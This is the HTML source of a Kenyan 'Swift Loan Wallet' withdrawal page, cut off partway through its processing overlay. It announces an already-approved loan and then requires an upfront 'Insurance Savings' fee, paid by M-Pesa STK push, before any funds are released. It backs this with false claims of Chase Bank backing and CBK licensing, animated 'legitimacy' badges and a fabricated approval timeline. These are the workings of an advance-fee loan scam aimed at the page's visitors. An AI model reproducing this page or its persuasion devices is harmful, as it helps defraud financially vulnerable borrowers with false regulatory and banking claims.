<!DOCTYPE html>
<html lang="en-KE">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Loan Withdrawal | Swift Loan - Withdraw your approved loan</title>
    <meta name="description" content="Withdraw your approved Swift Loan instantly. Secure loan disbursement process in Kenya.">
    
    <!-- Open Graph Tags -->
    <meta property="og:title" content="Loan Withdrawal - Swift Loan Kenya">
    <meta property="og:description" content="Withdraw your approved loan instantly with Swift Loan Kenya.">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://swiftloan.ke/loan-withdrawal.html">
    
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#225AAC',
                        'primary-dark': '#1a4a8a',
                        'primary-light': '#e8f1ff'
                    }
                }
            }
        }
    </script>
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        html {
            scroll-behavior: smooth;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #e8f1ff 0%, #f8faff 50%, #ffffff 100%);
            min-height: 100vh;
        }
        
        .swift-primary { color: #225AAC; }
        .swift-primary-bg { background-color: #225AAC; }
        .swift-primary-hover:hover { background-color: #1a4a8a; }
        .swift-primary-light { background-color: #e8f1ff; }
        
        .gradient-card {
            background: linear-gradient(135deg, #ffffff 0%, #f8faff 100%);
            backdrop-filter: blur(10px);
        }
        
        .shadow-swift {
            box-shadow: 0 20px 40px -5px rgba(34, 90, 172, 0.15), 0 10px 20px -5px rgba(34, 90, 172, 0.1);
        }
        
        .transition-swift {
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .pulse-ring {
            animation: pulse-ring 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
        }

        @keyframes pulse-ring {
            0% {
                transform: scale(0.33);
            }
            40%, 50% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                transform: scale(1.33);
            }
        }

        .bouncing-icon {
            animation: bounce-gentle 2s ease-in-out infinite;
        }

        @keyframes bounce-gentle {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        .slide-in {
            animation: slideIn 0.8s cubic-bezier(0.23, 1, 0.320, 1) forwards;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .processing-animation {
            animation: processing 2s linear infinite;
        }

        @keyframes processing {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .shake {
            animation: shake 0.5s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        /* Flowing arrow animation */
        .flowing-arrows {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .arrow-flow {
            animation: arrow-flow 2s ease-in-out infinite;
        }

        .arrow-flow:nth-child(2) {
            animation-delay: 0.3s;
        }

        .arrow-flow:nth-child(3) {
            animation-delay: 0.6s;
        }

        @keyframes arrow-flow {
            0%, 100% {
                opacity: 0.3;
                transform: translateX(-5px) scale(0.8);
            }
            50% {
                opacity: 1;
                transform: translateX(5px) scale(1.1);
            }
        }

        /* Modal styles */
        .modal-overlay {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
        }

        .modal-content {
            animation: modalSlideIn 0.4s cubic-bezier(0.23, 1, 0.320, 1) forwards;
        }

        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(50px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        /* Form validation styles */
        .form-field {
            transition: all 0.3s ease;
        }

        .form-field:focus {
            border-color: #225AAC;
            box-shadow: 0 0 0 3px rgba(34, 90, 172, 0.1);
        }

        .form-field.error {
            border-color: #ef4444;
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
        }

        .form-field.success {
            border-color: #10b981;
            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1);
        }

        .error-message {
            color: #ef4444;
            font-size: 0.875rem;
            margin-top: 0.25rem;
        }

        /* Enhanced processing overlay */
        .processing-overlay-enhanced {
            background: linear-gradient(135deg, #225AAC 0%, #1a4a8a 100%);
            position: relative;
            overflow: hidden;
        }

        .processing-overlay-enhanced::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            animation: shimmer 3s ease-in-out infinite;
        }

        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .legitimacy-indicator {
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        /* Mobile responsiveness */
        @media (max-width: 768px) {
            .hero-title {
                font-size: 2rem;
                line-height: 1.2;
            }
            
            .modal-content {
                margin: 1rem;
                width: calc(100% - 2rem);
            }
        }

        .error-state {
            background: linear-gradient(135deg, #fee2e2 0%, #fef2f2 100%);
            border: 1px solid #fecaca;
        }

        .success-state {
            background: linear-gradient(135deg, #dcfce7 0%, #f0fdf4 100%);
            border: 1px solid #bbf7d0;
        }

        #successAlert,
        #errorAlert {
            scroll-margin-top: 90px;
        }

        /* Method selection cards */
        .method-card {
            transition: all 0.3s ease;
            cursor: pointer;
            border: 2px solid transparent;
        }

        .method-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        .method-card.selected {
            border-color: #225AAC;
            background: linear-gradient(135deg, #e8f1ff 0%, #f0f8ff 100%);
        }

        /* Progress bar animation */
        .progress-bar-animated {
            background: linear-gradient(45deg, #10b981, #34d399);
            animation: progressFill 3s ease-in-out forwards;
        }

        @keyframes progressFill {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
@media print {
  /* Hide everything by default */
  body * {
    visibility: hidden !important;
  }

  /* Show only the receipt container and its contents */
  #receiptCardContainer, 
  #receiptCardContainer * {
    visibility: visible !important;
  }

  /* Position receipt nicely on page */
  #receiptCardContainer {
    margin: 0 auto;
    padding: 20px !important;
    width: 100% !important;
    max-width: 800px;
    border: 1px solid #000;
    box-shadow: none !important;
  }

  /* Force print header (logo + name) to show */
  #receiptCardContainer .print\:flex {
    display: flex !important;
  }

  /* Typography for print */
  #receiptCardContainer h2, 
  #receiptCardContainer h1 {
    font-size: 18pt !important;
    color: #000 !important;
  }
  #receiptCardContainer p, 
  #receiptCardContainer span {
    font-size: 11pt !important;
    color: #000 !important;
  }

  /* Hide buttons on print */
  #receiptCardContainer a,
  #receiptCardContainer button {
    display: none !important;
  }
</style>
 <!-- Brevo Conversations {literal} -->
<script>
    (function(d, w, c) {
        w.BrevoConversationsID = '67cfe70069e9058aa30db4b2';
        w[c] = w[c] || function() {
            (w[c].q = w[c].q || []).push(arguments);
        };
        var s = d.createElement('script');
        s.async = true;
        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
        if (d.head) d.head.appendChild(s);
    })(document, window, 'BrevoConversations');
</script>
<!-- /Brevo Conversations {/literal} -->
   </head>
<body class="bg-gradient-to-br from-blue-50 via-white to-blue-100">
    <!-- Header -->
    <header class="bg-white/80 backdrop-blur-md shadow-sm border-b border-gray-100 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-16">
                <!-- Logo -->
<div class="flex-shrink-0">
  <div class="flex items-center">
    <div class="w-10 h-10 rounded-lg flex items-center justify-center overflow-hidden">
      <img src="/loan-logo.png" alt="Swift Loan Logo" class="w-full h-full object-cover">
    </div>
    <span class="ml-3 text-xl font-bold text-gray-900">Swift Loan Wallet</span>
  </div>
</div>

                <!-- Action Buttons -->
                <div class="flex items-center space-x-3">
                    <button onclick="goBack()" class="border border-primary text-primary hover:bg-primary hover:bg-opacity-10 px-4 py-2 text-sm font-medium rounded-md transition-swift">
                        <i class="fas fa-arrow-left mr-1"></i> 
                    </button>
                </div>
            </div>
        </div>
    </header>
    <!-- Main Content -->
    <main class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <!-- Page Header -->
        <div class="text-center mb-8 slide-in">
            <div class="inline-flex items-center px-4 py-2 bg-green-100 text-green-800 rounded-full text-sm font-medium mb-6">
                <i class="fas fa-check-circle mr-2"></i>
                Loan Transfer to wallet  was Successfull & Ready for Withdrawal.

                powered by CHASEBANK and regulated by CBK
            </div>

            <h1 class="hero-title text-3xl lg:text-4xl font-bold text-gray-900 leading-tight mb-4">
                Withdraw Your 
                <span class="swift-primary">Loan Funds Instantly</span>
            </h1>
            <p class="text-lg text-gray-600 max-w-2xl mx-auto">
                Your loan has been approved and is ready for instant withdrawal to your preferred account.Contact our support team through the blue chat message button at the bottom right.,we are always online 24/7.note that for repayment  will be done at the repayment period,we have your details for follow up.
            </p>
        </div>

        <!-- Error Alert (Hidden by default) -->
        <div id="errorAlert" class="hidden mb-8 error-state rounded-2xl p-6 slide-in">
            <div class="flex items-start space-x-3">
                <i class="fas fa-exclamation-triangle text-red-600 text-xl mt-0.5 flex-shrink-0"></i>
                <div>
                    <h3 class="text-lg font-semibold text-red-800 mb-2">Transaction Failed</h3>
                    <p id="errorMessage" class="text-red-700 text-sm"></p>
                    <button onclick="hideError()" class="mt-3 text-red-600 hover:text-red-800 text-sm font-medium underline">
                        Dismiss
                    </button>
                </div>
            </div>
        </div>

        <!-- Success Alert (Hidden by default) -->
        <div id="successAlert" class="hidden mb-8 success-state rounded-2xl p-6 slide-in bg-green-100 border border-green-300">
            <div class="flex items-start space-x-3">
                <i class="fas fa-check-circle text-green-600 text-xl mt-0.5 flex-shrink-0"></i>
                <div class="w-full">
                    <h3 id="successHeading" class="text-lg font-semibold text-green-800 mb-2">Withdrawal Successfully Initiated!</h3>
                    <p id="successMessage" class="text-green-700 text-sm mb-3"></p>

                    <!-- Progress Bar -->
                    <div class="w-full bg-gray-200 rounded-full h-5 overflow-hidden relative mb-4">
                        <div id="progressBar" class="bg-green-600 h-5 w-0 transition-all duration-200"></div>
                        <span id="progressText" 
                              class="absolute inset-0 flex items-center justify-center text-xs font-medium text-white">
                              Processing previous withdrawal...
                        </span>
                    </div>
            <!-- Receipt Card (appears after withdrawal initiated) -->
<div id="receiptCardContainer" class="mt-6"></div>
              <!-- Need Help Link -->
<div class="text-center mt-4">
  <button 
    onclick="openHelpModal()" 
    class="text-sm font-medium text-blue-600 hover:text-blue-800 underline">
    Need help? Verify Transaction 
  </button>
</div>
                    <!-- Logos Row with Arrow Transfer Animation -->
                    <div class="flex justify-center items-center space-x-8 mt-4">
                        <!-- Swift Wallet Logo -->
                        <div class="flex flex-col items-center">
                            <div class="w-12 h-12 bg-primary rounded-lg flex items-center justify-center">
                                <i class="fas fa-wallet text-white text-xl"></i>
                            </div>
                            <span class="text-xs text-gray-700 mt-1 font-medium">Swift Wallet</span>
                        </div>

                        <!-- Transfer Animation (Flowing Arrows) -->
                        <div class="flowing-arrows">
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                        </div>

                        <!-- Selected Method Logo -->
                        <div class="flex flex-col items-center">
                            <div id="selectedMethodLogo" class="w-12 h-12 bg-green-600 rounded-lg flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-white text-xl"></i>
                            </div>
                            <span id="selectedMethodName" class="text-xs text-gray-700 mt-1 font-medium">M-Pesa</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Loan Summary Card -->
        <div class="gradient-card rounded-2xl shadow-swift p-8 mb-8 slide-in border border-white/50">
            <div class="flex items-center justify-between mb-6">
                <h2 class="text-2xl font-bold text-gray-900">Loan Summary</h2>
                <div class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-semibold">
                    <i class="fas fa-check mr-1"></i> APPROVED
                </div>
            </div>

            <div class="grid md:grid-cols-2 gap-8">
                <!-- Customer Details -->
                <div class="space-y-4">
                    <h3 class="text-lg font-semibold text-gray-800 mb-4">Customer Details</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Full Name:</span>
                            <span id="customerName" class="font-semibold text-gray-900">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Phone Number:</span>
                            <span id="customerPhone" class="font-semibold text-gray-900">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Loan ID:</span>
                            <span id="loanId" class="font-semibold text-primary">Loading...</span>
                        </div>
                    </div>
                </div>

                <!-- Loan Details -->
                <div class="space-y-4">
                    <h3 class="text-lg font-semibold text-gray-800 mb-4">Loan Details</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Loan Amount:</span>
                            <span id="loanAmount" class="font-bold text-green-600">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Loan savings:</span>
                            <span id="processingFee" class="font-semibold text-orange-600">Loading...</span>
                        </div>
                        <div class="flex justify-between pt-3 border-t border-gray-200">
                            <span class="text-lg font-bold text-gray-900">Available Balance:</span>
                            <span id="availableBalance" class="text-2xl font-bold text-primary">Loading...</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Withdrawal Section -->
        <div class="gradient-card rounded-2xl shadow-swift p-8 mb-8 slide-in border border-white/50">
            <div class="text-center mb-8">
                <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4 bouncing-icon">
                    <i class="fas fa-money-bill-transfer text-primary text-2xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-gray-900 mb-2">Withdraw My Loan</h2>
                <p class="text-gray-600">Choose your preferred withdrawal method and complete the process</p>
            </div>

            <!-- Withdrawal Amount Display -->
            <div class="bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-6 mb-8 text-center border-2 border-green-200 shadow-sm">
                <div class="flex items-center justify-center mb-3">
                    <i class="fas fa-coins text-green-600 text-lg mr-2"></i>
                    <div class="text-sm font-medium text-green-900">Verified Withdrawal Amount</div>
                </div>
                <div id="withdrawalAmount" class="text-4xl font-bold text-green-700 mb-2">Loading...</div>
                <div class="text-sm text-gray-600 mb-2">
                    <i class="fas fa-info-circle mr-1"></i>
                    <span id="feeNotice">Actual amount approved</span>
                </div>
                <div class="flex justify-center items-center space-x-4 text-xs text-gray-500">
                    <span>
                        <i class="fas fa-university mr-1"></i>
                        Chase Bank LMTD
                    </span>
                    <span>â€¢</span>
                    <span>
                        <i class="fas fa-shield-alt mr-1"></i>
                        Approved amount
                    </span>
                </div>
            </div>

            <!-- Action Buttons -->
            <div class="flex flex-col sm:flex-row gap-4">
                <button 
                    onclick="goBack()"
                    class="flex-1 px-8 py-4 border-2 border-gray-300 text-gray-700 font-semibold rounded-xl hover:bg-gray-50 transition-swift flex items-center justify-center"
                >
                    <i class="fas fa-arrow-left mr-2"></i>
                    Cancel
                </button>
                <button 
                    onclick="showWithdrawalMethods()"
                    id="withdrawBtn"
                    class="flex-1 px-8 py-4 bg-gradient-to-r from-primary to-blue-600 text-white font-bold rounded-xl hover:from-primary-dark hover:to-blue-700 transition-swift flex items-center justify-center shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
                >
                    <i class="fas fa-wallet mr-2"></i>
                    <span id="withdrawText">Choose Withdrawal Method</span>
                </button>
            </div>

            <!-- Important Notice -->
            <div class="mt-8 bg-blue-50 border border-blue-200 rounded-xl p-4">
                <div class="flex items-start space-x-3">
                    <i class="fas fa-info-circle text-blue-600 mt-0.5 flex-shrink-0"></i>
                    <div class="text-sm text-blue-800">
                        <p class="font-semibold mb-2"><i class="fas fa-lightbulb mr-1"></i> Important Information:</p>
                        <ul class="space-y-1 text-xs">
                            <li>â€¢ Choose from M-Pesa, Airtel Money, or Bank Transfer</li>
                            <li>â€¢ All withdrawal methods are secure and encrypted</li>
                            <li>â€¢ Funds will be credited to your account.check updates in the system generated receipt</li>
                            <li>â€¢ Keep your phone nearby for confirmation process</li>
                            <li>â€¢ You will receive SMS confirmation once completed</li>
                            <li>â€¢ Verify your details carefully before proceeding</li>
                            <li>â€¢ ðŸ”°NOTE that all your loan funds are securely  held by chase bank regulated by CBK.Savings securely releases the funds to your Mpesa,Airtel money and Bank accounts.</li>
                           
                            <li>â€¢ if you encounter any problem dont hesitate to contact our support team through the blue chat widget at the bottom right side.we are always online</li>
                           
 
                            <li>â€¢The live loan receipt are possessed by our loan systems and show the current status of the applicant loan.if you get any problem,download the pdf receipt and send to live support for assistance.
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!-- Transaction History Preview -->
        <div class="gradient-card rounded-2xl shadow-swift p-8 slide-in border border-white/50">
            <h3 class="text-xl font-bold text-gray-900 mb-6">Transaction Timeline</h3>
            
            <div class="space-y-4">
                <!-- Timeline Item 1 -->
                <div class="flex items-start space-x-4">
                    <div class="w-3 h-3 bg-green-500 rounded-full mt-2 relative">
                        <div class="absolute inset-0 bg-green-500 rounded-full pulse-ring"></div>
                    </div>
                    <div class="flex-1">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="font-semibold text-gray-900">Loan Application Submitted</h4>
                                <p class="text-sm text-gray-600">Your loan request was successfully submitted</p>
                            </div>
                            <span class="text-xs text-gray-500">2 min ago</span>
                        </div>
                    </div>
                </div>

                <!-- Timeline Item 2 -->
                <div class="flex items-start space-x-4">
                    <div class="w-3 h-3 bg-green-500 rounded-full mt-2"></div>
                    <div class="flex-1">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="font-semibold text-gray-900">Credit Check Completed</h4>
                                <p class="text-sm text-gray-600">Eligibility verification completed successfully</p>
                            </div>
                            <span class="text-xs text-gray-500">1 min ago</span>
                        </div>
                    </div>
                </div>

                <!-- Timeline Item 3 -->
                <div class="flex items-start space-x-4">
                    <div class="w-3 h-3 bg-green-500 rounded-full mt-2"></div>
                    <div class="flex-1">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="font-semibold text-gray-900">Loan Approved</h4>
                                <p class="text-sm text-gray-600">Your loan has been approved and is ready for withdrawal</p>
                            </div>
                            <span class="text-xs text-gray-500">Just now</span>
                        </div>
                    </div>
                </div>

                <!-- Timeline Item 4 - Pending -->
                <div id="disbursementTimeline" class="flex items-start space-x-4 opacity-50">
                    <div class="w-3 h-3 bg-gray-300 rounded-full mt-2"></div>
                    <div class="flex-1">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="font-semibold text-gray-900">Funds Disbursement</h4>
                                <p class="text-sm text-gray-600">Waiting for your withdrawal confirmation by competing Savings payment to release your available balance funds</p>
                            </div>
                            <span class="text-xs text-gray-500">Pending</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Quick Links Box -->
        <div class="bg-blue-100 border border-blue-300 rounded-xl p-4 mt-8">
            <h4 class="text-lg font-semibold mb-3 text-blue-700">Swift Loan Wallet Quick Links</h4>
            <ul class="space-y-2">
                <li>
                    <a href="/eligibility" 
                       class="flex items-center space-x-2 p-2 rounded-lg text-orange-600 bg-white hover:bg-blue-200 hover:text-orange-500 transition-all font-medium">
                        <i class="fas fa-chart-line text-orange-500"></i>
                        <span>Check My Loan Eligibility</span>
                    </a>
                </li>
                <li>
                    <a href="/help" 
                       class="flex items-center space-x-2 p-2 rounded-lg text-orange-600 bg-white hover:bg-blue-200 hover:text-orange-500 transition-all font-medium">
                        <i class="fas fa-headset text-orange-500"></i>
                        <span>Swift Loan Wallet Support</span>
                    </a>
                </li>
                <li>
                    <a href="/track" 
                       class="flex items-center space-x-2 p-2 rounded-lg text-orange-600 bg-white hover:bg-blue-200 hover:text-orange-500 transition-all font-medium">
                        <i class="fas fa-search text-orange-500"></i>
                        <span>Track My Loan Application</span>
                    </a>
                </li>
                <li>
                    <a href="/support" 
                       class="flex items-center space-x-2 p-2 rounded-lg text-orange-600 bg-white hover:bg-blue-200 hover:text-orange-500 transition-all font-medium">
                        <i class="fas fa-question-circle text-orange-500"></i>
                        <span>Swift Loan Wallet Help Centre</span>
                    </a>
                </li>
            </ul>
        </div>
    </main>

    <!-- Withdrawal Method Selection Modal -->
    <div id="withdrawalMethodModal" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50">
        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
            <div class="p-6 border-b border-gray-200">
                <div class="flex items-center justify-between">
                    <h3 class="text-2xl font-bold text-gray-900">Choose Withdrawal Method</h3>
                    <button onclick="closeWithdrawalModal()" class="text-gray-400 hover:text-gray-600 transition-colors">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
                <p class="text-gray-600 mt-2">Select your preferred method to receive your loan funds</p>
            </div>

            <div class="p-6">
                <!-- Method Selection Cards -->
                <div class="grid gap-4 mb-6">
                    <!-- M-Pesa Option -->
                    <div class="method-card bg-white rounded-xl p-4 border-2 shadow-sm" onclick="selectMethod('mpesa')">
                        <div class="flex items-center space-x-4">
                            <div class="w-16 h-16 bg-green-100 rounded-xl flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
                            </div>
                            <div class="flex-1">
                                <h4 class="text-lg font-semibold text-gray-900">M-Pesa</h4>
                                <p class="text-sm text-gray-600">Instant mobile money transfer</p>
                                <p class="text-xs text-green-600 font-medium">Most Popular â€¢ withdrawal updates in receipt</p>
                            </div>
                            <div class="text-gray-400">
                                <i class="fas fa-chevron-right"></i>
                            </div>
                        </div>
                    </div>

                    <!-- Airtel Money Option -->
                    <div class="method-card bg-white rounded-xl p-4 border-2 shadow-sm" onclick="selectMethod('airtel')">
                        <div class="flex items-center space-x-4">
                            <div class="w-16 h-16 bg-red-100 rounded-xl flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-red-600 text-2xl"></i>
                            </div>
                            <div class="flex-1">
                                <h4 class="text-lg font-semibold text-gray-900">Airtel Money</h4>
                                <p class="text-sm text-gray-600">Mobile money transfer</p>
                                <p class="text-xs text-red-600 font-medium">Fast â€¢ withdrawal updates in receipt</p>
                            </div>
                            <div class="text-gray-400">
                                <i class="fas fa-chevron-right"></i>
                            </div>
                        </div>
                    </div>

                    <!-- Bank Transfer Option -->
                    <div class="method-card bg-white rounded-xl p-4 border-2 shadow-sm" onclick="selectMethod('bank')">
                        <div class="flex items-center space-x-4">
                            <div class="w-16 h-16 bg-blue-100 rounded-xl flex items-center justify-center">
                                <i class="fas fa-university text-blue-600 text-2xl"></i>
                            </div>
                            <div class="flex-1">
                                <h4 class="text-lg font-semibold text-gray-900">Bank Transfer</h4>
                                <p class="text-sm text-gray-600">Direct transfer to your bank account</p>
                                <p class="text-xs text-blue-600 font-medium">Secure â€¢ withdraw updates in receipt</p>
                            </div>
                            <div class="text-gray-400">
                                <i class="fas fa-chevron-right"></i>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Security Notice -->
                <div class="bg-gray-50 rounded-xl p-4">
                    <div class="flex items-start space-x-3">
                        <i class="fas fa-shield-alt text-green-600 mt-0.5"></i>
                        <div class="text-sm">
                            <p class="font-semibold text-gray-900 mb-1">Secure & Encrypted</p>
                            <p class="text-gray-600">All transactions are protected with bank-level security and 256-bit encryption.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Retry Payment Modal -->
    <div id="retryPopup" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50 p-4">
        <div class="bg-white rounded-2xl shadow-2xl max-w-sm w-full p-6 animate-in fade-in zoom-in duration-300">
            <div class="text-center">
                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-exclamation-circle text-red-600 text-2xl"></i>
                </div>
                <h3 class="text-xl font-bold text-gray-900 mb-2">Transaction Cancelled/Failed</h3>
                <p class="text-gray-600 text-sm mb-6">You cancelled the payment or it timed out. Please retry to complete your withdrawal.</p>
                
                <div class="bg-gray-50 rounded-xl p-4 mb-6 space-y-2 text-left">
                    
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-500">Savings amount:</span>
                        <span id="retryFeeAmount" class="font-bold text-orange-600">KES 0</span>
                    </div>
                </div>

                <div class="space-y-3">
                    <button onclick="retryWithdrawal()" class="w-full py-3 bg-primary text-white font-bold rounded-xl hover:bg-primary-dark transition-all shadow-lg shadow-primary/20 flex items-center justify-center">
                        <i class="fas fa-sync-alt mr-2"></i> Retry payment
                    </button>
                    <button onclick="closeRetryPopup()" class="w-full py-3 bg-gray-100 text-gray-700 font-semibold rounded-xl hover:bg-gray-200 transition-all flex items-center justify-center">
                        Cancel
                    </button>
                </div>
            </div>
        </div>
    </div>
    <!-- Error Popup Modal -->
    <div id="errorPopup" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50 p-4">
        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-md w-full mx-4 overflow-hidden">
            <div class="bg-red-50 p-6 border-b border-red-100 text-center">
                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4 bouncing-icon">
                    <i class="fas fa-exclamation-circle text-red-600 text-3xl"></i>
                </div>
                <h3 class="text-xl font-bold text-gray-900 mb-1">Savings Payment Cancelled/Failed</h3>
                <p class="text-sm text-gray-600">The STK push was not completed.</p>
            </div>
            
            <div class="p-6">
                <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-6">
                    <p class="text-sm text-gray-700 text-center mb-2">
                        To receive your loan of <span class="font-bold text-green-700" id="retryLoanAmount">KES 50,000</span>,
                    </p>
                    <p class="text-sm text-gray-700 text-center">
                        Please pay the Insurance Savings of <span class="font-bold text-orange-600" id="retryFeeAmount">KES 350</span>
                    </p>
                </div>

                <button onclick="retryWithdrawal()" 
                        class="w-full py-3 px-4 bg-gradient-to-r from-green-600 to-green-700 text-white font-bold rounded-xl shadow-lg hover:from-green-700 hover:to-green-800 transition-all transform hover:scale-[1.02] flex items-center justify-center">
                    <i class="fas fa-sync-alt mr-2"></i>
                    Retry Payment Now
                </button>
                
                <button onclick="closeRetryPopup()" class="w-full mt-3 py-3 px-4 text-gray-500 font-medium hover:text-gray-700 transition-colors">
                    Cancel & Close
                </button>
            </div>
        </div>
    </div>

    <!-- Withdrawal Details Modal -->
    <div id="withdrawalDetailsModal" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50">
        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-lg w-full max-h-[90vh] overflow-y-auto">
            <div class="p-6 border-b border-gray-200">
                <div class="flex items-center justify-between">
                    <h3 class="text-xl font-bold text-gray-900" id="detailsModalTitle">Withdrawal Details</h3>
                    <button onclick="closeDetailsModal()" class="text-gray-400 hover:text-gray-600 transition-colors">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
            </div>

            <div class="p-6">
                <!-- Dynamic form container -->
                <div id="withdrawalForm">
                    <!-- Form content will be dynamically inserted here -->
                </div>

                <!-- Action Buttons -->
                <div class="flex space-x-3 mt-6">
                    <button onclick="closeDetailsModal()" class="flex-1 px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors">
                        <i class="fas fa-arrow-left mr-2"></i>Back
                    </button>
                    <button onclick="processWithdrawal()" id="processBtn" class="flex-1 px-4 py-3 bg-primary text-white rounded-lg hover:bg-primary-dark transition-colors">
                        <i class="fas fa-paper-plane mr-2"></i>Withdraw Funds
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Enhanced Processing Overlay -->
    <div id="processingOverlay" class="fixed inset-0 processing-overlay-enhanced hidden items-center justify-center z-50">
        <div class="text-center text-white relative z-10">
            <div class="w-32 h-32 mx-auto mb-8 bg-white bg-opacity-20 rounded-full flex items-center justify-center relative">
                <div class="processing-animation">
                    <i class="fas fa-sync-alt text-4xl"></i>
                </div>
                <!-- Legitimacy indicators -->
                <div class="absolute -top-2 -right-2 w-8 h-8 bg-green-500 rounded-full flex items-center justify-center legitimacy-indicator">
                    <i class="fas fa-check text-white text-sm"></i>
                </div>
            </div>
            
            <h2 class="text-3xl font-bold mb-4">Processing Your Loan Withdrawal</h2>
            <p class="text-xl mb-4" id="processingMessage">Initiating SwiftWallet Digital Ventures STK Push...</p>
            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone  for the payment request from SWIFTWALLET DIGITAL VENTURES</p>
            
            <!-- Trust indicators -->
            <div class="flex justify-center items-center space-x-6 mb-6">
                <div class="flex items-center space-x-2 legitimacy-indicator">
                    <i class="fas fa-shield-alt text-green-400"></i>
                    <span class="text-sm">Bank Grade Security</span>
                </div>
                <div class="flex items-center space-x-2 legitimacy-indicator">
                    <i class="fas fa-lock text-green-400"></i>
                    <span class="text-sm">256-bit Encryption</span>
                </div>
                <div class="flex items-center space-x-2 legitimacy-indicator">
                    <i class="fas fa-certificate text-green-400"></i>
                    <span class="text-sm">Licensed by CBK</span>
                </div>
            </div>
            
            <!-- Progress steps -->
            <div class="max-w-md mx-auto">
                <div class="flex justify-between text-sm mb-2">
                    <span id="step1" class="text-green-400">Validating</span>
                    <span id="step2" class="text-gray-400">Processing</span>
                    <span id="step3" class="text-gray-400">Confirming</span>
                </div>
                <div class="w-full bg-white bg-opacity-20 rounded-full h-2">
